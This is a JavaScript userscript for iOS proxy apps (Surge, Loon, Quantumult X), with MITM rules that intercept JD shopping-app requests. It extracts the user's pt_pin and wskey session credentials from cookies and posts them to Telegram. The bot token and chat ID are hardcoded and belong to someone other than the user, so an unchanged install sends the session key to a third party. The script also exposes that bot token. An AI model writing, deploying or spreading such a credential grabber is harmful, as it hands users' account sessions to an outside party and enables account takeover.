/*
##发送wskey到tg，自行更换脚本TG_USER_ID和TG_BOT_TOKEN
杀掉后台后打开京东app获取wskey
在脚本日志查看值

type: http-request
regex: ^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(genToken|serverConfig)$
script-path: https://raw.githubusercontent.com/Charles-Hello/ql_tools/master/wskey.js

###### Surge ######
[Script]
http-request ^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(genToken|serverConfig)$ script-path=https://raw.githubusercontent.com/15974296618/zjy/main/wskey.js, requires-body=true, timeout=120, tag=京东获取wskey

[Mitm]
hostname = %APPEND% api.m.jd.com

###### Loon ######
[Script]
http-request ^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(genToken|serverConfig)$ script-path=https://raw.githubusercontent.com/15974296618/zjy/main/wskey.js, requires-body=true, timeout=120, tag=京东获取wskey

[Mitm]
hostname = api.m.jd.com

###### QuanX ######
[rewrite_local]
^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(genToken|serverConfig)$ url script-request-header https://raw.githubusercontent.com/15974296618/zjy/main/wskey.js

[Mitm]
hostname = api.m.jd.com

*/

const $ = Env()
if (typeof $request !== 'undefined') {
  set()
  $.done()
}

async function set() {
  url = $request.url
  old = $.read("jd_wskey")
  if (!old) {$.write("pin=x;wskey=x;", "jd_wskey")}
  cookie = $request.headers.Cookie
  old_pin = old.split(";")[0] + ";"
  old_wskey = old.split(";")[1] + ";"
  if (url.indexOf("serverConfig") != -1) {
    new_pin = cookie.match(/(pt_pin=[^;]*)/)[1].replace('pt_', '') + ";"
    jd_wskey = new_pin + old_wskey
    $.write(jd_wskey, "jd_wskey")
  } else {
    new_wskey = cookie.match(/(wskey=[^;]*)/)[1] + ";"
    jd_wskey = old_pin + new_wskey
    $.write(jd_wskey, "jd_wskey")
    console.log(jd_wskey)
    $.notice("【京东】", "抓取wskey成功，请自行发给🐱🐱🐱机器人！！", jd_wskey)
    await tgNotify(jd_wskey)
  }
}


function tgNotify(text) {
  return  new Promise(resolve => {
    TG_USER_ID = '647938378'
    TG_BOT_TOKEN = '1293324392:AAHk4U7PFDrMygrsh0B8cEbpKNGHjJXEqxA'
    if (TG_BOT_TOKEN && TG_USER_ID) {
      const options = {
        url: `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,
        body: `chat_id=${TG_USER_ID}&text=${text}&disable_web_page_preview=true`,
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        timeout: 30000
      }
      $.post(options, (err, resp, data) => {
        try {
          if (err) {
            $.log('发送通知消息失败！')
            $.log(err)
          } else {
            data = JSON.parse(data)
            if (data.ok) {
              $.log('发送通知消息完成')
            } else if (data.error_code === 400) {
              $.log('检查接收用户ID是否正确')
            } else if (data.error_code === 401){
              $.log('Telegram bot token 填写错误')
            }
          }
        } catch (e) {
          $.log(e)
          $.log(resp)
        } finally {
          resolve()
        }
      })
    } else {
      $.log('不进行 Telegram 推送');
      resolve()
    }
  })
}


function Env() {
  LN = typeof $loon != "undefined"
  SG = typeof $httpClient != "undefined" && !LN
  QX = typeof $task != "undefined"
  read = (key) => {
    if (LN || SG) return $persistentStore.read(key)
    if (QX) return $prefs.valueForKey(key)
  }
  write = (key, val) => {
    if (LN || SG) return $persistentStore.write(key, val);
    if (QX) return $prefs.setValueForKey(key, val)
  }
  notice = (title, subtitle, message, url) => {
    if (LN) $notification.post(title, subtitle, message, url)
    if (SG) $notification.post(title, subtitle, message, { url: url })
    if (QX) $notify(title, subtitle, message, { "open-url": url })
  }
  get = (url, cb) => {
    if (LN || SG) {$httpClient.get(url, cb)}
    if (QX) {url.method = 'GET'; $task.fetch(url).then((resp) => cb(null, {}, resp.body))}
  }
  post = (url, cb) => {
    if (LN || SG) {$httpClient.post(url, cb)}
    if (QX) {url.method = 'POST'; $task.fetch(url).then((resp) => cb(null, {}, resp.body))}
  }
  put = (url, cb) => {
    if (LN || SG) {$httpClient.put(url, cb)}
    if (QX) {url.method = 'PUT'; $task.fetch(url).then((resp) => cb(null, {}, resp.body))}
  }
  log = (message) => console.log(message)
  done = (value = {}) => {$done(value)}
  return { LN, SG, QX, read, write, notice, get, post, put, log, done }
}
